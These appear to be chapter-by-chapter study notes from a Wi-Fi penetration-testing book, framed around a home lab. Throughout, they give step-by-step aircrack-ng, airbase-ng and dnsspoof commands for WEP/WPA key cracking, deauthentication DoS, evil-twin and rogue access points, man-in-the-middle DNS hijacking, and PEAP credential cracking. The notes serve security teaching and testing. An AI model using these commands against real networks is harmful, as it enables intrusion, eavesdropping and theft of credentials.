# Notes
This book was written for BackTrack, but it's fully
compatible with Kali Linux.

# Chapter 1: Wireless Lab Setup
## Hardware requirements
* Two machines with internal Wi-Fi cards
* Both should have at least 3GB of RAM
* An Alfa wireless adapter or an equivalent which:
 * Supports packet injection
 * Supports packet sniffing
 * Is supported by BackTrack
* An access point which
 * Supports WEP/WPA/WPA2
* An internet connection

## Software requirements
* BackTrack 5 (or Kali Linux)
* Windows XP/Vista/7

## Installing BackTrack
This is fairly obvious and has been documented in
countless places on the web, so I won't dwell on this.

## Setting up the access point
* Enter the IP address of the access point
configuration terminal in your
browser
* This is usually the gateway IP address returned by
the `route -n` or `ip route` command
* Explore the various settings
* Change the **SSID** to "Wireless Lab"
* Change the **authentication** to **Open
Authentication**
* Save changes and reboot the access point, if required

## Setting up the wireless card
* If it's an external one, plug it in
* Type:
 * `iwconfig` -> lists all interfaces
 * `ifconfig wlan0 up` -> activates interface wlan0
 * `ifconfig wlan0` -> checks wlan0's status

## Connecting to the access point
* Type `iwlist wlan0 scanning` to find networks in your
vicinity
 * ESSID is the SSID aka name of the network
 * SSIDs aren't unique, so compare MAC address with the
 one written underneath the access point or on its
 admin GUI
* Type `iwconfig wlan0 essid "Wireless Lab"` to connect
* Type `iwconfig wlan0` to check the status
* Assuming the access point's IP address is 192.168.0.1
 * `ifconfig wlan0 192.168.0.2 netmask 255.255.255.0
 up`
 * ping 192.168.0.1 or arp -a to check MAC address
* You can check connection logs on the access point

# Chapter 2: WLAN and its Its Inherent Insecurities
## Revisiting WLAN frames
The book assumes you have a basic understanding of the
protocol and the packet headers

* Three types of frames:
* Management frames
 * Authentication
 * De-authentication
 * Association Request
 * Association Response
 * Re-association Request
 * Re-association Response
 * Disassociation
 * Beacon
 * Probe Request
 * Probe Response
* Control frames
 * Request to Send (RTS)
 * Clear to Send (CTS)
 * Acknowledgement (ACK)
* Data frames

We will now use Wireshark. Alternatives to Wireshark
are, for example, Airodump-NG, Tcpdump, and Tshark.

Next, we'll create a monitor mode interface for
promiscuous mode - a mode which allows a network card
to capture **any** packets in the air, not just the  
ones destined for it.

## Creating a monitor mode interface
* `iwconfig` to confirm that network card is detected
and drivers
are properly loaded
* `ifconfig wlan0 up` to bring the card up - you should
see UP in the second line of the output if it worked
* `airmon-ng` and check if it detects wlan0
* `airmon-ng start wlan0`
* `airmon-ng` again to check if mon0 was created
* `ifconfig` should now display a new interface named
mon0

## Sniffing wireless packets
* `wireshark` to open Wireshark
* Once it's open click on the **Capture | Interfaces**
sub-menu
* Start capturing on the mon0 interface

## Viewing Management, Control, and Data frames
* To view Management frames, enter `wlan.fc.type == 0`
in the filter
* Click **Apply**
* To stop the packets from scrolling, click **Stop**
* `wlan.fc.type == 1` filter for Control Frames
* `wlan.fc.type == 2` filter for Data frames
* To select sub-types:
 * `wlan.fc.subtype` filter
 * example for Beacon frames among all Management
 frames:
`(wlan.fc.type == 0) && (wlan.fc.subtype == 8)`
 * Or you can click on header field and select **Apply as
 Filter | Selected**

## Sniffing data packets for our network
* Set your access point to use no encryption
* `airodump-ng --basid <MAC address> mon0`:
find channel on which your access point is running
* `iwconfig mon0 channel <channel>`
* `iwconfig mon0` to check
* Open Wireshark and start sniffing the mon0 interface
* `wlan.bssid == <MAC address>` filter
* `(lan.bssid == <MAC address>) &&
(wlan.fc.type_subtype == 0x20)` filter for data packets
* Visit your access point's management URL to generate
packets to capture

## Packet injection
* `(wlan.bssid == 00:21:91:d2:8e:25) &&
!(wlan.fc.type_subtype == 0x08)` for non-beacon
* `aireplay-ng -9 -e Wireless Lab -a <MAC> mon0`
to inject packets

## Important note on WLAN sniffing and injection
* WLANs operate at 2.4GHz, 3.6GHz, and 4.9/5.0GHz
* Not all Wi-Fi cards support all these ranges
* Each frequency rage has multiple channels
* A Wi-Fi card can only be on one channel at a time

## Experimenting with your Alfa (or other) card
* `iwconfig wlan0` to check available bands
(802.11bgn)
* `iwconfig mon0 channel <channel number>`
to set channel

## Role of regulatory domains in wireless
Each country has different laws for power levels
and frequencies

## Experimenting with your card
* `iw reg set US` to set card to US standards
* /var/log/messages to check
* `iwconfig wlan0 txpower <dBm>` to set transmit power

# Chapter 3: Bypassing WLAN Authentication
## Hidden SSIDs
* By default, access points broadcast their SSIDs
* Hiding the SSID isn't that great for security

## Uncovering hidden SSIDs
* Configure your access point to not broadcast its SSID
* Your access point will then stop sending Beacon frames
* Clients connecting to the network generate
Probe Request and Probe response packets, containing
the SSID
* `aireplay-ng -0 5 -a <MAC> mon0`
 * -0: chooses Deauthentication attack
 * 5: number of Deauthentication packets to send
 * -a: target access point's MAC address
 * Forces all legitimate clients to disconnect and
 reconnect
 * This will generate Probe Request and Response frames
 which contain the SSID

## MAC filters
* Used to be a good idea for wired connections
* Useless security measure for wireless networks
* Consists of maintaining a list of allowed MAC addresses
at the access point

## Beating MAC filters
* Add MAC filtering for your target machine on your
access point
* `airodump-ng -c 11 -a --bssid <MAC> mon0`
 * -a: only clients associated and connected are shown
 * This will show us the MAC addresses of clients
 connected to that network
* `macchanger -m <MAC> waln0`
 * Spoofs our MAC address
 * -m: new spoofed address

## Open Authentication
Open authentication authenticates all clients which
connect. There's no authentication at all.

## Bypassing Open Authentication
* Set your access point to use Open Authentication
* `iwconfig wlan0 essid "Wireless Lab"` to connect

## Shared Key Authentication
* Uses a shared secret such as the WEP key
* Flow
 * Client sends auth request to access point
 * Access point responds with a challenge
 * Client encrypts the challenge with the shared key and
 sends it back
 * Access points decrypts it and checks if it matches
 * If it matches, the client authenticates, else it sends
 an auth failed message
* An attacker can passively intercept the plain text
challenge and the encrypted response
* XOR to retrieve keystream, which can be used to auth

## Bypassing Shared Authentication
* Set up Shared Authentication on your access point
(WEP security mode and Shared Key auth)
* Connect a legitimate client to the network using the key
* `airodump-ng mon0 -c 11 --bssid <MAC> -w keystream`
 * Logs the entire shared auth exchange
 * -w: prefix of the file in which to store the packets
* You can also force a reconnect (discussed previously)
* Capture has succeeded if airodump-ng shows **SKA**
in the **AUTH** column
* The keystream is stored in a file called <prefix><target
mac address>.xor
* `aireplay-ng -1 0 -e Wireless Lab -y
keystream-01-00-21-91-D2-8E-25.xor -a 00:21:91:D2:8E:25 -h
aa:aa:aa:aa:aa:aa mon0. aireplay-ng` to auth with the
target access point
* Wireshark filter: `wlan.addr == aa:aa:aa:aa:aa:aa`
* aireplay-ng lets us know if it succeeded
* Verifying with Wireshark
 * 1st packet is the auth request sent by aireplay-ng
 * 2nd packet is the challenge text response sent by
 the access point
 * 3rd packet is the encrypted challenge sent by
 aireplay-ng
 * 4th packet is the success message sent by the access
 point
 * After the auth, aireplay-ng fakes association with
 the access point
 * The association can be verified in the access point's
 logs
 * This can be used to DoS an access point since they
 have a max number of clients

# Chapter 4: WLAN Encryption Flaws
* WEP is broken to death
* WPA/WPA2 is much more secure

## WLAN encryption
* IEEE 802.11 standards:
 * Wired Equivalent Privacy (WEP - rip)
 * WiFi Protected Access (WPA)
 * WiFi Protection Access v2 (WPAv2)

## WEP encryption
* Cracked even as early as 2000
* `ifconfig wlan0 up`
* `airmon-ng start wlan0` to create `mon0`
* `iwconfig` to verify mon0 was created
* `airodump-ng mon0` to find the wireless network
* `airodump=ng -bbssid <Access point's MAC> --channel <AP's
channel> --write WEPCrackingDemo mon0` sniffs and saves
packets of target AP
* In the AUTH column, you should see SKA once a client
connects.
* To capture more packets we will capture ARP packets
and inject them back to simulate ARP responses
* In a separate terminal:
 * `aireplay-ng -3 -b <AP's MAC> -h <MAC>` -3: ARP replay, -b:
 our network's BSSID, -h: spoofed client's MAC
 * Only works for authenticated and associated MAC addresses
* In a separate window, start cracking the WEP key:
 * `aircrack-ng WEPCracking WEPCrackingDemo-01.cap`
 * Wait 5-10 minutes while still running airodump-ng
 and aireplay-ng in the background
 * Once key is found, aircrack-ng displays it and exits
* Even if client leaves during the process, the fake
authentication and association using Shared Key Auth bypassing
(discussed earlier) should do the deal

## WPA/WPA2
* WPA (= WPA v1) uses TKIP encryption
* WPA2 uses AES-CCMP encryption
* Both allow:
 * EAP auth (Enterprise - Radius servers)
 * Pre-Shared Key (PSK) (Personal)
* WPA/WPA2 PSK is vulnerable to dictionary attacks
* Per-session key (Pairwuse Transient Key - PTK) derived
using the PSK, network SSID, Authenticator Nounce (ANounce),
Supplicant Nounce (SNounce), AP MAC, and Wi-Fi Client MAC
* PTK encrypts data between AP and client
* Everything can be eavesdropped over the air except for
the PSK
* Cracking WPA-PSK this way works the same way for WPA2-PSK

## Cracking WPA-PSK weak passphrase
* `airodump-ng -bssid <AP BSSID> -channel <AP channel>
-write WPACrackingDemo mon0`
* Wait or force client to reconnect:
 * `aireplay-ng --deauth 1 -a <AP BSSID> mon0`
* As soon as WPA handshake is captured, it will show on the
top right corner, followed by the AP's BSSID
* Stop airodump-ng
* Now we'll use dictionaries. These comes in all flavors,
Backtrack/Kali ships with some, but it's best to
find your own.
* `aircrack-ng WPACrackingDemo-01.cap -w
/pentest/passwords/wordlists/darkc0de.lst`
* If the key is in the dictionary, aircrack-ng will show the
key and then exit
* Cowpatty is another good WPA/WPA2 cracking tool

## Speeding up WPA/WPA2 PSK cracking
* Pre-calculate the PMK for a given SSID and wordlist
* `genpmk -f <path to dictionary> -d <output file> -s
"<SSID>"`
* `cowpatty -d <file created by genpmk> -s <SSID> -r <cap
file>` to crack. This takes mere seconds.
* To do the same with aircrack-ng:
 * `airolib-ng <output file> --import cowpatty <file created
 by genpmk>`
 * `aircrack-ng -r <file created by airolib-ng> <cap file>`
* There's other tools available too, like Pyrit:
 * `pyrit -r <cap file> -i <file created by genpmk>
 attack_cowpatty`

## Decrypting WEP and WPA packets
* `airdecap-ng -w <WEP key> <cap file>`
* Decrypted files are stored in <cap file name>-dec.cap
* `tshark -r <decrypted cap file> -c 10` to view first 10
packets in the terminal
* For WPA:
 * `airdecap-ng -p <PSK> <cap file> -e "<SSID>"`

## Connecting to WEP and WPA networks
### WEP
* `iwconfig wlan0 essid <SSID> key <WEP key>`
* `iwconfig wlan0` to check

### WPA
* iwconfig doesn't support WPA/WPA2
* We'll use `WPA_supplicant`
* Create `wpa-supp.conf` file:

```
# WPA-PSK/TKIP

network={
    ssid=<SSID>
    key_mgmt=WPA-PSK
    proto=WPA
    pairwise=TKIP
    group=TKIP
    psk="<PSK>"
}
```

* `wpa_supplicant -Dwext -iwlan0 -c wpa-supp.conf`

* Once connected for WEP or WPA/WPA2, use `dhclient3 wlan0`
to grab DHCP address from the network

# Chapter 5: Attacks on the WLAN Infrastructure
* Various attacks against the WLAN infrastructure:
 * Default accounts and credentials on AP
 * DoS attacks
 * Evil twin and AP MAC spoofing
 * Rogue APs

## Default accounts and credentials on the access point
* We'll check if default passwords have been changed
on the AP
* If not, use google to find default username & pass
* Else, use Hydra or something similar to bruteforce through
HTTP auth

## Denial of service attacks
* Possible techniques:
 * De-auth attack
 * Dis-association attack
 * CTS-RTS attack
 * Signal interference or spectrum jamming attack

## De-Auth DoS attack
* Run airodump to detect connecting clients
* `aireplay-ng --deauth 1 -a <AP BSSID> -h <AP BSSID> -c
<client MAC> mon0`
* `aireplay-ng --deauth 0 -a <AP BSSID> -h <AP BSSID> mon0` to
send a Broadcast De-Auth packet (to all connected clients)
* Use this repeatedly to totally deny access to a network

## Evil twin and access point MAC spoofing
* Users get tricked by another AP using the same SSID as the
legitimate AP. It gets worse if the twin AP also mirrors
the other's MAC by spoofing it.

## Evil twin with MAC spoofing
* `airodump-ng` to get BSSID and ESSID
* `airbase-ng -a AA:AA:AA:AA:AA:AA --essid "<ESSID> -c 11
mon0"` to copy ESSID (yet not the BSSID and MAC)
* run airdump-ng again to see the new network
* `aireplay-ng --deauth 0 -a <AP BSSID> mon0` to make the
clients disconnect and connect to the twin AP (assuming the
twin AP's signal is stronger because the AP is closer)
* To spoof BSSID and MAC for the access point:
 * `airbase-ng -a <BSSID> --essid "<ESSID>" -c 11 mon0`
 * Now if you run airodump-ng, it won't even be able to
 distinguish the two networks

## Rogue access point
* It's an unauthorized AP connected to an authorized network
* Used as a backdoor to bypass all security controls on the
network
* Done in two ways:
 * Physically set up and connect to the authorized network
 * Create in software and bridge with the local authorized
 network. Allows any laptop running on the authorized
 network to become a rogue AP

## Rogue access point
* `airbase-ng --essid Rogue -c 11 mon0` to create an AP
* `brctl addbr Wifi-Bridge` to create bridge between
the Ethernet Interface (authorized network) and the rogue
AP
* `brctl addif Wifi-Bridge eth0`
* `brctl addif Wifi-Bridge at0` (at0 is the interface created
by airbase)
* `ifconfig eth0 0.0.0.0 up`
* `ifconfig at0 0.0.0.0 up`
* `echo 1 > /proc/sys/net/ipv4/ip_forward` to enable
IP forwarding in the kernel

# Chapter 6: Attacking the Client
* Shifting focus on client:
 * Honeypot and mis-association attacks
 * Caffe latte attack
 * De-auth and dis-association attacks
 * Hirte attack
 * AP-less WPA-Personal cracking

## Honeypot and Mis-Association attacks
* When a machine is turned on, it usually probes for the
networks it previously connected to. It will display any
networks available in its range
* Two choices:
 * Silently monitor the probe and bring up a fake AP
 with the ESSID the client is searching for
 * Create fake APs with same ESSIDs as the neighbouring ones

## Orchestrating a mis-association attack
* `airdumo-ng mon0` to check clients
* Clients not connected to an AP will be shown probing in most
cases
* Fire up Wireshark on mon0 and filter for Probe Request
packets from the specific client MAC
 * `wlan.fc.type_subtype == 0x04 && wlan.sa == <client MAC>`
* `airbase-ng --essid "<ESSID> -c 3 mon0"` to launch the
fake AP
* Client will connect to the fake AP
* To make a fake AP while existing one is running:
 * `airbase-ng --essid "<ESSID>" -c 3 mon0`
 * Client is still connected to the legitimate AP
 * `aireplay-ng --deauth 0 -a <AP BSSID> mon0` to de-auth the
 client
 * If our AP's signal is stronger, the client connects to the
 fake AP

## Caffe Latte attack
* Clients continuously probe for SSIDs they have previously
connected to
* WEP keys are stored by the client

## Conducting the Caffe Latte attack
* When there's an unassociated client
* `airbase-ng -c 3 -a <AP BSSID> -e "<SSID>" -L -W 1 mon0`
* start airodump-ng to collect packets from this AP
* start aircrack-ng to crack
 * `aircrack-ng <path to cap file>`
* The attack works by bit flipping and replaying ARP packets
* The replayed ARPs generate more ARPs to be sent
* These ARPs are encrypted by the WEP key stored on the client

## De-Authentication and Dis-Association attacks
* Earlier we used de-auth attacks in the AP context
* This time it will be in the client context

## De-Authenticating the client
* Run airodump-ng to find the client
* `aireplay-ng --deauth 1 -c <client MAC> -a <AP BSSID> mon0`
* Client is disconnected and tried to reconnect
* This works on both WEP and WPA/WPA2

## Dis-Association attack on the client
* You can also use de-auth packets to achieve the same thing

## Hirte attack
* It's like the Caffe Latte attack, but uses fragmentation
techniques to allow almost any packet to be used
* `airbase-ng -c 3 -a <AP BSSID> -e "<SSID>" -W 1 -N mon0`
* `airodump-ng -c 3 --bssid <AP BSSID> --write <output> mon0`
in a separate terminal
* Once a roaming client connects to the honeypot AP,
the Hirte attack is launched
* Use aircrack-ng to crack the WEP key

## AP-less WPA-Personal cracking
* Earlier we captured the four-way WPA handshake and a
dictionary to crack the PSK
* To crack WPA, we need four packets:
 * Authenticator nounce
 * Supplicant nounce
 * Authenticator MAC
 * Supplicant MAC
* To crack WPA we need just packets 1 & 2 or just 2 & 3
* So, we make a honeypot AP that will receive packets
1 and 2 (we can't send packet 3 without the PSK)

## AP-less WPA cracking
* `airbase-ng -c 3 -a <AP BSSID> -e "<SSID>" -W 1 -z 2 mon0`
-z 2 creates a WPA-PSK AP with TKIP encryption
* `airodump-ng -c 3 --bssid <AP BSSID> --write <out> mon0`
* Client connects and the handshake fails, but we got what we
needed
* airodump-ng shows that a handshake has been captured
* Run the airodump-ng capture file through aircrack-ng with
a dictionary
* If the password is in the dictionary, it'll be cracked

# Chapter 7: Advanced WLAN Attacks
* Man-in-the-Middle attack
* Wireless Eavesdropping using MITM
* Session Hijacking using MITM

## Man-in-the-Middle attack
* One of the most potent attacks on a WLAN system
* For our purposes we'll assume:
 * Attacker is connected to a wired network
 * Attacker creates an evil twin AP
 * Attacker forwards user traffic using the bridge between the
 wireless and wired interfaces

## Man-in-the-Middle attack
* `airbase=ng --essid mitm -c 11 mon0` to create a soft access
point
* This creates an at0 interface (`ifconfig` to verify)
* Bridge between eth0 (wired) and at0:
 * `brctl addbr mitm-bridge`
 * `brctl addif mitm-bridge eth0`
 * `brctl addif mitm-bridge at0`
 * `ifconfig eth0 0.0.0.0 up`
 * `ifconfig at0 0.0.0.0 up`
 * `ifconfig mitm-bridge 192.168.0.199 up` to assign IP
 address
 * `echo 1 > /proc/sys/net/ipv4/ip_forward` to turn on
 IP forwarding
* In Wireshark, start sniffing on the at0 interface
* Pinging the gateway address from the client machine
goes through our at0 interface even if it's not destined
for us

## Man-in-the-Middle over pure wireless
* You could simultaneously host an AP and connect wirelessly
to another AP
* You would need two wireless cards though

## Wireless Eavesdropping using MITM
* We assume that all the victim's traffic is routed through
our computer

## Wireless eavesdropping
* Replicate the whole MITM setup
* Start sniffing on the at0 interface using Wireshark
* When a client opens a webpage:
 * Wireshark shows a bunch of new packets
 * You can filter for HTTP traffic only (`http` filter)
 * Check out POST requests for credentials
 * They're often encrypted/hashed. This is beyond the scope
 of this book.
 * You can still eavesdrop on Google searches and other
 plain-text requests though

## Session Hijacking over wireless
* During MITM, the attacker has full control over the
clients' packets
* So, he can modify the packets. However, they may be
encrypted or protected from tampering.
* We will demonstrate a DNS hijack to hijack the browser
session to Google.com

## Session hijacking over wireless
* Set up the MITM config
* When a client connects to google.com in his browser:
 * In Wireshark, apply the `dns` filter
 * You should see packets with DNS requests for google.com
 * `dnsspoof -i mitm-bridge` to send fake DNS responses
 * This replaces the google.com IP by the attacker's IP
 * Launch a web server at port 80 on the attacker machine
* Check out Ettercap, a great tool to modify packet data

## Finding security configurations on the client
* We've seen how to make honeypots for open APs, WEP, and WPA
* How to check to which network an SSID belongs using
clients' Probe Requests?
 * Create access points with the same SSID but with
 different security configurations

## Enumerating wireless security profiles
* Assume client is sending Probe Requests for a certain SSID
when it's not connected to it
* We will assume that the client thinks it's either an
open, WEP, or WPA-PSK/WPA2-PSK network.
* So, we create four distinct APs
* `airmon-ng start wlan0` multiple times to create interfaces
mon0 to mon3
* `ifconfig -a` to view all interfaces
* `airbase-ng --essid "<SSID>" -a AA:AA:AA:AA:AA:AA -c 3 mon0`
to create the open AP
* `airbase-ng --essid "<SSID>" -c 3 -a BB:BB:BB:BB:BB:BB
-W 1 mon1` for WEP AP
* `airbase-ng --essid "<SSID>" -c 3 -a CC:CC:CC:CC:CC:CC
-W 1 -z 2 mon2` for WPA-PSK AP
* `airbase-ng --essid "<SSID>" -c 3 -a DD:DD:DD:DD:DD:DD
-W 1 -Z 2 mon3` for WPA2-PSK AP
* Run airodump-ng to check the four newly created APs
* A roaming client will now connect to one of these 4 APs
when it searches for that specific SSID

# Chapter 8: Attacking WPA-Enterprise and RADIUS
## Setting up FreeRadius
* **FreeRadius**: open source Radius server
* **FreeRadius-WPE**: FreeRadius Wireless Pwnage Edition
* Pre-installed on backtrack

## Setting up the AP with FreeRadius-WPE
* Connect computer to an Ethernet port on your AP
* run `dhclient3 <interface>` to get an IP address via DHCP
* Set AP's Security Mode to **WPA-Enterprise**
* Under **EAP (802.1x)** section, set
**RADIUS server IP Address** to the IP obtained earlier
* **RADIUS server Shared Secret**: test
* cd to `/usr/local/etc/raddb` (this is where
FreeRadius-WPE configs are)
* Check out `eap.conf`, leave it as it is
* Open `clients.conf`
 * Set **secret** field
* Start the Radius server with `radiusd -s -X`

## Attacking PEAP
* **PEAP**: Protected Extensible Authentication
Protocol
* PEAP: most popular EAP version, ships natively with Windows
* Two versions:
 * PEAPv0 - EAP-MSCHAPv2 - most popular, ships with Windows
 * PEAPv1 - EAP-GTC
* PEAP uses server-side certs, most attacks will exploit
mis-configurations of those certs

## Cracking PEAP (with a Honeypot)
* Check `eap.conf` to see that PEAP is enabled
* Restart Radius server: `Radiusd -s -X`
* `tail /usr/local/var/log/radius/freeradius-server-wpe.log
-n 0 -f` to monitor the log file
* On Windows, turn off Certificate Verification
* Connect to the AP to start PEAP auth
* Enter some username and password
 * The response is logged in the log file
* Crack the password with a password list:
 * `asleap -C <challenge> -R <response> -W list`

## Attacking EAP-TTLS
* **EAP-TTLS**: EAP-Tunneled Transport Layer Security
* Server uses that to authenticate with a cert
* Most common auth protocol for that is MSCHAP-v2
* EAP-TTLS is not natively supported on Windows (but it is
on OS X for example)

## Cracking EAP-TTLS
* Enabled by default in `eap.conf`
* Start the server and monitor the log file
* Connect and enter some username and password
* Use Asleap again to crack using a password list

## Security best practices for Enterprises
* Use WPA2-PSK with a strong password
* WPA2-Enterprise + EAP-TLS for large companies
* If using PEAP or EAP-TTLS
 * Turn on cert validation
 * Choose right cert authorities
 * Don't allow clients to accept new Radius servers, certs, or
 cert authorities

# Chapter 9: WLAN Penetration Testing Methodology
## Wireless penetration testing
* Phases:
 * Planning phase
 * Discovery phase
 * Attack phase
 * Reporting phase

## Planning
* Scope of the assessment: location, area, number of APs and
clients, which networks, full exploit or simply informed
* Effort estimation: time frame, depth of testing
* Legality: indemnity agreement, NDA, local laws

## Discovery
## Discovering wireless devices
* Create a monitor mode interface
 * `ifoncifg -a`
 * `ifocnfig <wireless interface> up`
 * `airmon-ng start <wireless interface>`
* Scan the airspace
 * `airodump-ng --band bg --cswitch 1 mon0`: ensures
 channel hopping happens on both 802.11b 802.11g
* Move around the area to get the most APs and clients
* From the admins, obtain a list of MAC address for all APs
and clients

## Attack
* Finding rogue APs
* Finding client mis-associations
* Finding unauthorized clients
* Cracking the encryption
* Breaking into the infrastructure
* Compromising clients

## Finding rogue access points
* Authorized AP:
 * ESSID: Wireless Lab
 * MAC Address: 00:21:91:D2:8E:25
 * Configuration: WPA-PSK
* Authorized Clients:
 * MAC Address: 60:FB:42:D5:E4:01

## Finding rogue access points
* In most cases AP's wired and wireless MAC address differ by
1

## Finding unauthorized clients
* Look at the client part of airodump-ng
* Look for unauthorized MAC addresses

## Cracking WPA
* `airodump-ng --channel <channel> --bssid <AP MAC> --write
WPA-PSK <interface>`
* Wait for a handshake or de-auth a client
* `aircrack-ng -b <AP MAC> -w <dictionary> WPA-PSK-01.cap`

## Compromising the clients
* Run `airodump-ng`
* Some clients may have multiple preferred networks
(**Probes** column)
* Create an evil twin AP: `airbase-ng --essid <name>
<interface>`
* Disconnect the client: `aireplay-ng --deauth 0 -a
<client MAC> <interface>`
* Client connects to the fake AP

## Reporting
* Vulnerability description
* Severity
* Affected devices
* Vulnerability type: software, hardware, or config
* Workarounds
* Remediation

# Appendix A: Conclusion and Road Ahead
## Building an advanced Wi-Fi lab
* Directional Antennas:
 * Boosts signal
 * Detect networks from further away
* Check out other AP models
* Try out other Wi-Fi cards
* Try exploiting cell-phones and tablets too

## Staying up-to-date
* Mailing Lists:
 * http://www.securityfocus.com/
 * Wifisec@securityfocus.com
* Websites
 * http://www.aircrack-ng.org
 * http://www.raulsiles.com/resources/wifi.html
 * http://www.willhackforsushi.com/
* Conferences
 * http://www.defcon.org
 * http://www.blackhat.com
* BackTrack/Kali
 * http://www.offensive-security.com
